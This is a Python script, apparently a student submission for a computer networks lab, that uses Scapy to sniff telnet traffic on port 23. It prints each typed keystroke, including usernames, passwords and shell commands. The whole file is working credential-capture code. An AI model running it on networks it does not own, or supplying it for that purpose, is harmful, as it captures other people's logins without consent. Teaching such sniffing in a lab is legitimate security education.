#!/usr/bin/env python3
# ==============================================================================
# File Name:     telnet_sniffer.py
# Author:        Eva Tate and Giselle Wu
# Course:        CS60: Computer Networks
# Assignment:    Lab 1: Packet sniffing and spoofing
# Date:          September 29, 2026
#
# Description:   Implements the telnet password sniffer described in
#                Lab 1, Exercise 3.
#
# ==============================================================================

"""Telnet keystroke sniffer using Scapy.

Sniffs TCP port 23 traffic and prints each keystroke exactly once as the
user types it (username, password, and any shell commands), ignoring the
packets in which the remote host echoes the keystroke back.

Usage: sudo python3 telnet_sniffer.py [interface]
"""

import sys

from scapy.layers.inet import TCP
from scapy.packet import Raw
from scapy.sendrecv import sniff

TELNET_PORT = 23
# Printable ASCII, plus carriage return / line feed.
PRINTABLE = set(range(0x20, 0x7F)) | {0x0D, 0x0A}


def handle_packet(pkt):
    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return

    # Only look at packets heading TO port 23 (client -> server). These are
    # the characters the user actually typed. Packets FROM port 23
    # (server -> client, sport == 23) are the server echoing the keystroke
    # back to the terminal, and are skipped so each character is printed once.
    if pkt[TCP].dport != TELNET_PORT:
        return

    data = pkt[Raw].load
    for byte in data:
        # Skip telnet protocol negotiation bytes (IAC/DO/WILL/etc.), which
        # show up as non-printable control bytes outside of CR/LF.
        if byte in PRINTABLE:
            sys.stdout.write(chr(byte))
    sys.stdout.flush()


def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else None
    print(f"Sniffing telnet traffic on {iface or 'default interface'} (Ctrl+C to stop)...")
    sniff(filter=f"tcp port {TELNET_PORT}", iface=iface, prn=handle_packet, store=False)


if __name__ == "__main__":
    main()
